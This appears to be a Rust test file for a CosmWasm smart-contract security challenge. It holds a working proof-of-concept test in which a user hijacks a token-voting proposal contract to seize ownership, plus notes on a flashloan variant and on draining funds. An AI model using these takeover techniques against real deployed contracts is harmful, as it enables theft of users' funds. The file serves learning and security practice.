#[cfg(test)]
pub mod tests {
    use crate::msg::{Cw20HookMsg, ExecuteMsg, QueryMsg};
    use crate::state::Config;
    use cosmwasm_std::{attr, to_binary, Addr, Empty, Uint128};
    use cw20::{Cw20ExecuteMsg, MinterResponse};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    fn token_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            cw20_base::contract::execute,
            cw20_base::contract::instantiate,
            cw20_base::contract::query,
        );
        Box::new(contract)
    }

    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";
    pub const VOTING_WINDOW: u64 = 10;

    pub fn proper_instantiate() -> (App, Addr, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        let cw_20_id = app.store_code(token_contract());

        // Init token
        let token_inst = cw20_base::msg::InstantiateMsg {
            name: "OakSec Token".to_string(),
            symbol: "OST".to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };

        let token_addr = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Init challenge
        let challenge_inst = crate::msg::InstantiateMsg {
            token: token_addr.to_string(),
            owner: ADMIN.to_string(),
            window: VOTING_WINDOW,
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Minting - 10k to User1, 10k to User2, 100k to Admin
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: USER1.to_string(),
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: USER2.to_string(),
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: ADMIN.to_string(),
                amount: Uint128::new(100_000),
            },
            &[],
        )
        .unwrap();

        (app, contract_addr, token_addr)
    }

    pub fn base_scenario() -> (App, Addr, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        let cw_20_id = app.store_code(token_contract());

        // Init token
        let token_inst = cw20_base::msg::InstantiateMsg {
            name: "OakSec Token".to_string(),
            symbol: "OST".to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };

        let token_addr = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Init challenge
        let challenge_inst = crate::msg::InstantiateMsg {
            token: token_addr.to_string(),
            owner: ADMIN.to_string(),
            window: VOTING_WINDOW,
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Minting  100k to Admin
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Mint {
                recipient: ADMIN.to_string(),
                amount: Uint128::new(100_000),
            },
            &[],
        )
        .unwrap();

        (app, contract_addr, token_addr)
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // cannot propose second time
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap_err();

        // Admin votes, simulates msg from CW20 contract
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(60_001),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));

        // Check ownership transfer
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER1.to_string());
    }

    #[test]
    /*
    @note
    •   Minting - 10k to User1, 10k to User2, 100k to Admin
    •   total supply is 120k
    */
    fn test_exploit1(){
        let (mut app, proposal_contract, token_contract) = proper_instantiate();
        
        //balance of admin is 100k. suppose USER2 is proposed
        app.execute_contract(
            Addr::unchecked(USER2),
            proposal_contract.clone(),
            &ExecuteMsg::Propose{},
            &vec![],  
        ).unwrap();

        /*
        @note
        •   This exploit relies on the possibility that admin does not immediately 
            pass the vote threshold with their vote. If this happens, there is no path
            in resolve_proposal that would get the current proposal removed because this
            only happens when the balance of the contract does not exceed 1/3 of the total 
            supply.
        */
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_contract.clone(),
            &Cw20ExecuteMsg::Send{
                contract: proposal_contract.to_string(),
                amount: Uint128::new(35000),
                msg: to_binary(&Cw20HookMsg::CastVote{}).unwrap(),
            },
            &vec![],  
        ).unwrap();

        /*
        @note

        •   USER1 can now get the proposal removed since the vote threshold has not been
            met yet by sending ResolveProposal msg

        •   they can then propose themselves as the owner, reach the vote 
            threshold by sending their tokens to the proposal contract, then
            resolve the proposal again, which will pass this time because there
            are now enough votes
        
        •   USER1 can then send all the funds in the proposal contract to themselves?
        */
        app.execute_contract(
            Addr::unchecked(USER1),
            proposal_contract.clone(),
            &ExecuteMsg::ResolveProposal{},
            &vec![],  
        ).unwrap();

        //previous proposal has now been removed
        //USER1 proposes
        app.execute_contract(
            Addr::unchecked(USER1),
            proposal_contract.clone(),
            &ExecuteMsg::Propose{},
            &vec![],  
        ).unwrap();

        //USER1 surpasses vote threshold 
        app.execute_contract(
            Addr::unchecked(USER1),
            token_contract.clone(),
            &Cw20ExecuteMsg::Send{
                contract: proposal_contract.to_string(),
                amount: Uint128::new(10000),
                msg: to_binary(&Cw20HookMsg::CastVote{}).unwrap(),
            },
            &vec![],  
        ).unwrap();
        
        //USER1 now resolves proposal to make them the owner
        app.execute_contract(
            Addr::unchecked(USER1),
            proposal_contract.clone(),
            &ExecuteMsg::ResolveProposal{},
            &vec![],  
        ).unwrap();

        let new_config: Config = app
        .wrap()
        .query_wasm_smart(
            proposal_contract,
            &QueryMsg::Config{}
        ).unwrap();
        
        assert_eq!(USER1, new_config.owner.to_string());
    }

    /*
    @note
    
    •   I read this approach in a writeup instead of figuring it out for myself
        because I assumed we were not allowed to use flashloans for this challenge, but I did annotate the issue this exploit involves prior. 
        
    •   The cw20 reception callback does not properly error out when it receives
        the binary encoding of a message other than Cw20ExecuteMsg::CastVote{}, allowing one
        to flashloan at least a third of the total supply, send it to the proposal contract
        without reversion, then call resolve_proposal to become contract owner.
    */
    fn test_exploit2(){
        //todo
    }

}
